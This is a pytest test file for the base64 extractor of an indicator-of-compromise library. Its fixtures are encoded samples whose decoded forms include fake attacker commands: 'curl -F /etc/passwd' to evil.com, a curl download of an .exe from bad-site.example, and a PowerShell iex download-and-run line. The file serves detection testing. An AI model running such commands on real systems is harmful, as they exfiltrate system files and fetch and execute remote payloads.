import pytest
from iocx.extractors.base64 import extract

def test_basic_base64_decoding():
    # Long enough, printable, valid base64
    text = "aGVsbG8gd29ybGQ="
    assert extract(text) == [
        "aGVsbG8gd29ybGQ= (decoded: hello world)"
    ]


def test_multiple_base64_strings():
    # These are only 8 characters long → below the 12‑char minimum
    # The extractor should ignore them.
    text = "aGVsbG8= IHdvcmxk"
    assert extract(text) == []


def test_ignores_invalid_base64():
    text = "notbase64@@@"
    assert extract(text) == []


def test_url_command_string():
    # Long, printable, decodes cleanly → should be accepted
    text = "aHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLnBocCBjdXJsIC1GIC9ldGMvcGFzc3dk"
    assert extract(text) == [
        "aHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLnBocCBjdXJsIC1GIC9ldGMvcGFzc3dk (decoded: https://evil.com/payload.php curl -F /etc/passwd)"
    ]


def test_base64_json_with_multiple_iocs():
    # Long, printable JSON → should decode
    text = "eyJ1cmwiOiAiaHR0cDovL21hbGljaW91cy5zaXRlL2Rvd25sb2FkIiwgImRvbWFpbiI6ICJtYWxpY2lvdXMuc2l0ZSIsICJpcCI6ICIxOTIuMTY4LjAuMSJ9"
    assert extract(text) == [
        "eyJ1cmwiOiAiaHR0cDovL21hbGljaW91cy5zaXRlL2Rvd25sb2FkIiwgImRvbWFpbiI6ICJtYWxpY2lvdXMuc2l0ZSIsICJpcCI6ICIxOTIuMTY4LjAuMSJ9 (decoded: {\"url\": \"http://malicious.site/download\", \"domain\": \"malicious.site\", \"ip\": \"192.168.0.1\"})"
    ]


def test_base64_powershell_payload():
    # This decodes to UTF‑16LE *but also contains control characters*
    # Your stricter extractor rejects it → expected result is now empty.
    text = "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACIAOwAgAGkAZQB4ACAAJAB1AHIAbAA="
    assert extract(text) == []


def test_nested_base64_no_recursion():
    # Outer string is long enough and printable → accepted
    # Inner string is NOT decoded recursively → correct behaviour
    text = "YUdWc2JHOGdkMmxrYVc1bGNpNXNhVzVyYjNScGJtYz0="
    assert extract(text) == [
        "YUdWc2JHOGdkMmxrYVc1bGNpNXNhVzVyYjNScGJtYz0= (decoded: aGVsbG8gd2lkaW5lci5saW5rb3Rpbmc=)"
    ]


def test_long_multiline_base64_payload():
    # Long, printable, multi‑line → should decode
    text = (
        "U2VydmVyOiBodHRwOi8vYmFkLXNpdGUuZXhhbXBsZS9kb3dubG9hZD8xMjM0NTYKUGF5bG9hZDogL3RtcC9maWxlLmV4ZQpDb21tYW5kOiBjdXJsIC1PIGZpbGUuZXhlIGh0dHA6Ly9iYWQtc2l0ZS5leGFtcGxlL2ZpbGUuZXhl"
    )
    assert extract(text) == [
        "U2VydmVyOiBodHRwOi8vYmFkLXNpdGUuZXhhbXBsZS9kb3dubG9hZD8xMjM0NTYKUGF5bG9hZDogL3RtcC9maWxlLmV4ZQpDb21tYW5kOiBjdXJsIC1PIGZpbGUuZXhlIGh0dHA6Ly9iYWQtc2l0ZS5leGFtcGxlL2ZpbGUuZXhl (decoded: Server: http://bad-site.example/download?123456\nPayload: /tmp/file.exe\nCommand: curl -O file.exe http://bad-site.example/file.exe)"
    ]
